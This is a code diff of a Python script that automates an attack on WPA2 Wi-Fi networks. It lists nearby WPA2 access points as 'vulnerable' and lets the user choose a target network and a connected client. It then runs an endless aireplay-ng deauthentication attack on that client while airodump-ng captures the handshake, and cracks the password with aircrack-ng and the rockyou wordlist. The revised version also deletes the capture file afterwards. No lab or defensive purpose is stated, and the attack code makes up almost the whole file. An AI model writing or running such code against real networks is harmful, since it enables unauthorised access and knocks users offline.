@@ -1,41 +1,36 @@
-import subprocess, signal, sys, time, os, shutil, csv
-
-deauth_process = None  # Global variable to keep track of the deauth subprocess
-
-def dump(ap_mac, channel):
-    global deauth_process
-    try:
-        print("Starting packet capture on AP with BSSID:", ap_mac)
-        # Initiate packet capture
-        subprocess.run(["sudo", "airodump-ng", "wlan0mon", "--bssid", ap_mac, "-c", str(channel), "-w", "/mnt/data/wpa_attack"])
-    except Exception as e:
-        print("Failed to start dump:", e)
-    finally:
-        if deauth_process:
-            deauth_process.terminate()  # Terminate deauth process when dump is done or fails
+import subprocess, signal, sys, time, os, shutil, csv, glob
 
 def deauth(ap_mac, c_mac, interface):
     try:
-        print("Starting deauthentication attack on client with MAC:", c_mac)
-        # Start the deauth process in the background
-        global deauth_process
-        deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", ap_mac, "-c", c_mac, interface])
+        # Running the deauth command in the background
+        subprocess.Popen(['sudo', 'aireplay-ng', '-0', '0', '-a', ap_mac, '-c', c_mac, interface],
+                         stdout=subprocess.DEVNULL,
+                         stderr=subprocess.STDOUT)
     except Exception as e:
-        print("Failed to start deauth:", e)
+        print(f"Failed to execute deauth command: {e}")
+
+def dump(ap_mac, channel):
+    try:
+        # Executing the dump command without redirecting stdout and stderr
+        # This allows the output to be displayed in the console
+        subprocess.run(['sudo', 'airodump-ng', 'wlan0mon', '--bssid', ap_mac, '-c', str(channel), '-w', '/mnt/data/wpa2_handshake'])
+    except Exception as e:
+        print(f"Failed to execute dump command: {e}")
 
 def crack():
+    cap_file = "/mnt/data/wpa2_handshake-01.cap"
     try:
         print("Attempting to crack WPA password...")
-        subprocess.run(["sudo", "aircrack-ng", "/mnt/data/wpa_attack-01.cap", "-w", "/usr/share/wordlists/rockyou.txt"])
+        # Running the aircrack-ng command
+        subprocess.run(["sudo", "aircrack-ng", cap_file, "-w", "/usr/share/wordlists/rockyou.txt"])
+        
+        # If the command completes successfully, delete the .cap file
+        print("Cracking attempt completed. Deleting .cap file...")
+        os.remove(cap_file)
+        print(".cap file deleted successfully.")
+        
     except Exception as e:
-        print("Failed to start crack:", e)
-
-def signal_handler(sig, frame):
-    global deauth_process
-    if deauth_process:
-        deauth_process.terminate()  # Ensure deauth process is terminated on Ctrl+C
-    print('Operation canceled by user.')
-    sys.exit(0)
+        print(f"Failed to start crack: {e}")
 
 def move_cap_file():
     try:
@@ -43,7 +38,7 @@ def move_cap_file():
         print(".cap file moved to /mnt/data/")
     except Exception as e:
         print("Failed to move .cap file:", e)
-
+        
 def identify_wpa2():
     file_path = "/mnt/data/access_points.txt"
     try:
@@ -51,7 +46,7 @@ def identify_wpa2():
             csv_reader = csv.reader(file)
             vulnerable_aps = []
             for row in csv_reader:
-                if "WPA2" in row[1]:  # Assuming the encryption standard is in the second column
+                if "WPA2" in row[1]:
                     vulnerable_aps.append(row)
             if vulnerable_aps:
                 print("Vulnerable Access Points Found:")
@@ -86,18 +81,14 @@ def run_airodump(bssid):
         ]
         print("Running airodump-ng... Press Ctrl+C to stop.")
         
-        # Running the process without redirecting stdout and stderr so output will be shown in the console.
         airodump_process = subprocess.Popen(command)
         
         try:
-            # Wait for the process to complete, or for a KeyboardInterrupt (Ctrl+C) to stop it.
             airodump_process.wait()
         except KeyboardInterrupt:
-            # Terminate the process if the user interrupts with Ctrl+C.
             airodump_process.terminate()
             print("\nAirodump-ng stopped by user.")
         
-        # After stopping, proceed to process the generated CSV files.
         directory = ensure_data_directory_exists()
         csv_file = None
         for file in os.listdir(directory):
@@ -130,7 +121,6 @@ def run_airodump(bssid):
 
         print("Clients found and saved to:", clients_filename)
 
-        # Client selection.
         print("Select a client by its index number:")
         for index, client in enumerate(clients):
             print(f"{index}: {client}")
@@ -149,7 +139,6 @@ def run_airodump(bssid):
         return None
     
     finally:
-        # Delete all airodump files.
         try:
             for file in glob.glob(ensure_data_directory_exists() + "/airodump*"):
                 os.remove(file)
@@ -164,16 +153,14 @@ def target_ap():
             csv_reader = csv.reader(file)
             wpa2_aps = []
             for row in csv_reader:
-                if "WPA2" in row[1]:  # Assuming the encryption standard is in the second column
+                if "WPA2" in row[1]: 
                     wpa2_aps.append(row)
 
             if wpa2_aps:
                 print("Select a Vulnerable Access Point by its index number:")
                 for index, ap in enumerate(wpa2_aps):
                     print(f"{index}: SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
-                
-                # Assuming the selection process is outside of this function, as it would need user input.
-                # User should replace `selected_index` with the actual selection mechanism, e.g., input from the user.
+                    
                 selected_index = int(input("Enter the index number of the target AP: "))
                 if 0 <= selected_index < len(wpa2_aps):
                     selected_ap = wpa2_aps[selected_index]
@@ -195,27 +182,17 @@ def target_ap():
 def target_c(bssid):
     client_mac = run_airodump(bssid)
     return client_mac
-
+    
 def main(essid, ap_mac, your_mac, c_mac):
-    channel = "6"  # Channel should be a string as it's passed directly to subprocess commands
+    channel = "6"
     interface = "wlan0mon"
-    
-    signal.signal(signal.SIGINT, signal_handler)
-    
-    # Start deauth attack in the background
-    deauth(ap_mac, c_mac, interface)
-    
-    print("Collecting packets, press Ctrl+C to stop...")
-    try:
-        dump(ap_mac, channel)
-    except KeyboardInterrupt:
-        move_cap_file()
-        user_decision = input("\nDo you want to attempt to crack the WPA password? (y/n): ")
-        if user_decision.lower() == 'y':
-            print("Proceeding to crack the WPA password...")
-            crack()
-        else:
-            print("Operation aborted by the user.")
 
-if __name__ == "__main__":
-    main()
+    try:
+        deauth(ap_mac, c_mac, interface)
+
+        dump(ap_mac, channel)
+        
+    except KeyboardInterrupt:
+        print("\nExecution stopped by the user.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
